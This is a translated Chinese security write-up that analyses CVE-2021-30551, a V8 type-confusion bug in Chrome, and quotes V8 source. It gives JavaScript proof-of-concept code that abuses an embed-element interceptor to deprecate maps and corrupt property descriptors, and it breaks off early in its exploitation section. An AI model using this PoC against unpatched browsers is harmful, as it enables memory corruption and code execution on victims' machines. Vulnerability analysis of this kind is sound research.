# Chrome 在野0day：CVE-2021-30551的分析与利用
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 一、漏洞背景：
近日谷歌公开了四个在野0day，其中CVE-2021-30551是一个v8类型混淆的漏洞，对市面上一些内置浏览器均有影响，下面无恒实验室将根据p0公开的内容对漏洞的利用做一个简单的分享：
## 二、Root case
前面的一些内容p0的文章中（https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-30551.html）已经讲过了，这里简单提一下：
  1. 漏洞的过程和之前沙箱漏洞中的一种模式思路类似（resolve重入用户js）可以类比去理解。
  2. `HTMLEmbedElement`是少数具有属性拦截器的 DOM 类之一，每次用户尝试访问`Embed`的 JS 包装器的属性时将会运行特殊的方法，这个方法可以由用户自定义，也就相当于可以在v8执行过程中重入到用户js层–去执行用户定义的代码。
  3. 当对一个对象的命名属性进行操作时，如果该对象没有该属性时，将会去调用`SetPropertyInternal`函数遍历该对象的原型链
C++
    Maybe Object::SetPropertyInternal(LookupIterator* it,
    Handle value,
    Maybe should_throw,
    StoreOrigin store_origin, bool* found) {
    [...]
    do {
    switch (it->state()) {
    [...]
    case LookupIterator::INTERCEPTOR: {
    if (it->HolderIsReceiverOrHiddenPrototype()) {
    Maybe result =
    JSObject::SetPropertyWithInterceptor(it, should_throw, value);
    if (result.IsNothing() || result.FromJust()) return result;
    } else {
    Maybe maybe_attributes =
    JSObject::GetPropertyAttributesWithInterceptor(it);
    if (maybe_attributes.IsNothing()) return Nothing();
    if ((maybe_attributes.FromJust() & READ_ONLY) != 0) {
    return WriteToReadOnlyProperty(it, value, should_throw);
    }
    if (maybe_attributes.FromJust() == ABSENT) break;
    *found = false;
    return Nothing();
    }
    break;
    }
    [...]
    *found = false;
    return Nothing();
    }
如果在原型链中遍历到INTERCEPTOR（拦截器），将会去执行拦截器以确定是否应该抛出“只读属性”异常，此时将会调用用户定义好的js代码，接下来SetPropertyInternal将会报告该属性不存在，接着交由SetProperty去调用AddDataProperty来创建属性。
C++
    Maybe Object::SetProperty(LookupIterator* it, Handle value,
    StoreOrigin store_origin,
    Maybe should_throw) {
    if (it->IsFound()) {
    bool found = true;
    Maybe result =
    SetPropertyInternal(it, value, should_throw, store_origin, &found);
    if (found) return result;
    }
    [...]
    return AddDataProperty(it, value, NONE, should_throw, store_origin);
    }
先大致描述一下漏洞的产生：
当用户访问一个object的命名属性时，如果该obj没有该属性，就会进入上面的遍历原型链的过程，此时如果在拦截器中创建该属性，并将该obj的map更改为deprecated状态，之后在SetPropertyInternal遍历结束后去创建属性时就会创建一个同名的第二个属性，如果此时的map为deprecated状态，此时将只会更新属性的值而不会去修改map中的描述符（map中保存了一个描述符数组，里面储存了命名属性的相关信息）。从而导致类型混淆。
在根据poc来分析之前先做个小实验：
JavaScript
    global_object = {};
    const array = [1.1, 2.2, 3.3];
    const object_1 = {
    __proto__: global_object
    };
    object_1.regular_prop = 1; //------------------------------->map1
    %DebugPrint(object_1);
    %DebugPrint(object_1.regular_prop);
    %SystemBreak();
    Object.setPrototypeOf(global_object, null);
    object_1.corrupted_prop = array; //--------------------------->map2(map1 is deprecated)
    %DebugPrint(object_1);
    %SystemBreak();
    const object_2 = {
    __proto__: global_object
    };
    object_2.regular_prop = 1; //---------------------------------->map1
    %DebugPrint(object_2);
    %SystemBreak();
    Object.setPrototypeOf(global_object, null);
    object_2.corrupted_prop = array;//------------------------------>map2
    %DebugPrint(object_2);
    %SystemBreak();
    object_1.regular_prop = 1.1;//----------------------------------->map3(map2 is deprecated)
    %DebugPrint(object_1);
    %DebugPrint(object_2);
根据debug信息可以得到注释中的结论，之后根据该代码去实现在拦截器中将object的map设置为deprecated。
### 2.1 poc
JavaScript
    global_object = {};
    setPropertyViaEmbed = (object, value, handler) => {
    const embed = document.createElement('embed');
    embed.onload = handler;//遍历到拦截器后调用的js代码
    embed.type = 'text/html';
    Object.setPrototypeOf(global_object, embed); //将embed（拦截器）设置到原型链中
    document.body.appendChild(embed);
    object.corrupted_prop = value;//通过访问obj中不存在的命名属性触发SetPropertyInternal
    embed.remove();
    }
    createCorruptedPair = (value_1, value_2) => {//object1主要用于将object2的map设置为deprecated
    const object_1 = {
    __proto__: global_object
    };
    object_1.regular_prop = 1;
    setPropertyViaEmbed(object_1, value_2, () => {
    Object.setPrototypeOf(global_object, null);
    object_1.corrupted_prop = value_1;
    });
    const object_2 = {
    __proto__: global_object
    };
    object_2.regular_prop = 1;
    setPropertyViaEmbed(object_2, value_2, () => {
    Object.setPrototypeOf(global_object, null);
    object_2.corrupted_prop = value_1; //在重入的过程中创建刚才不存在的命名属性。
    object_1.regular_prop = 1.1//设置map为deprecated
    });
    return [object_1, object_2];
    }
主要的地方已经以注释的形式写在了poc中，下面是实现混淆的代码：
JavaScript
    const array = [1.1];
    array.prop = 1;
    const [object_1, object_2] = createCorruptedPair(array, target); //root case
    jit = (object) => {
    return object.corrupted_prop[0];
    }
    for (var i = 0; i  maybe_attributes =
    JSObject::GetPropertyAttributesWithInterceptor(it);
    if (maybe_attributes.IsNothing()) return Nothing();
    if ((maybe_attributes.FromJust() & READ_ONLY) != 0) {
    return WriteToReadOnlyProperty(it, value, should_throw);
    }
    if (maybe_attributes.FromJust() == ABSENT) break;
    *found = false;
    return Nothing();
    }
    //他为了判断是否需要抛出只读异常（WriteToReadOnlyProperty(it, value, should_throw);）将会去执行已经定义的拦截器代码
拦截器函数：
JavaScript
    () => {
    Object.setPrototypeOf(global_object, null);
    object_2.corrupted_prop = value_1; //在重入的过程中创建刚才不存在的命名属性。
    object_1.regular_prop = 1.1//设置map为deprecated
    }
在执行完上面的代码后，Object::SetPropertyInternal是不会根据已设定的拦截函数去判断是否创建该属性的，他只会返回一个false的found。
C++
    Maybe Object::SetProperty(LookupIterator* it, Handle value,
    StoreOrigin store_origin,
    Maybe should_throw) {
    if (it->IsFound()) {
    bool found = true;
    Maybe result =
    SetPropertyInternal(it, value, should_throw, store_origin, &found);
    if (found) return result;
    }
    [...]
    return AddDataProperty(it, value, NONE, should_throw, store_origin);
    }
于是这里会接着调用Object::SetProperty去第二次创建该属性。
接下来通过比较object1和object2的创建过程，来体会一下deprecated的作用，这里简单调试一下：
object_1:
object：
map：
descriptorarray：
这里简单对他的结构做了一个标注，可以看到在descriptorarray是存在两个相同key（同名）的属性的，分别对应了field 1 和 field
2，这个对照第一个图也可以看到在in-object
property中储存了value1（0x083305a9）和value2（0x08330649），相当于object_1具有了两个同名属性。
接下来是object_2：
可以看到它的map和obejct_1相同，但是不同于object_1，由于deprecated操作object_2并没有创建出两个同名属性，SetProperty只是将它的corrupted_prop属性由value1（0x083305a9）修改为了value2（0x08330649），由于此时的descriptorarray仍是之前的描述符，这就导致%DebugPrint(object_2.corrupted_prop);会错误的将field
2的值作为属性输出就会得到下面的结果：
最重要的是field 1处的值已经由value1修改为了value2，但是描述符并没有发生改变，这也是这个漏洞最关键的地方。
## 三、利用部分
利用开始前的题外话：
  1. 因为这个漏洞他需要使用到html的对象embed，所以是不能直接在d8上调试的，我的方法是在chrome上调试的同时拉一个debug版的d8来方便去查看内存布局，这样对照起来会方便一些。
  2. 可以使用下面的命令：
file ./chrome
set args –headless –disable-gpu –user-data-dir=./userdata –remote-debugging-port=1338 –no-sandbox –js-flags=”–allow-natives-syntax –trace-turbo”
http://127.0.0.1:8000/poc.html
set follow-fork-mode parent
之后在attach到render进程就可以调试v8了。
### 3.1越界读
接下来的重点就是如何使用描述符来消除掉checkmaps，最终实现类型混淆：
在load-elimination阶段将会进行冗余消除，v8将会去消除一些多余的检查：
C++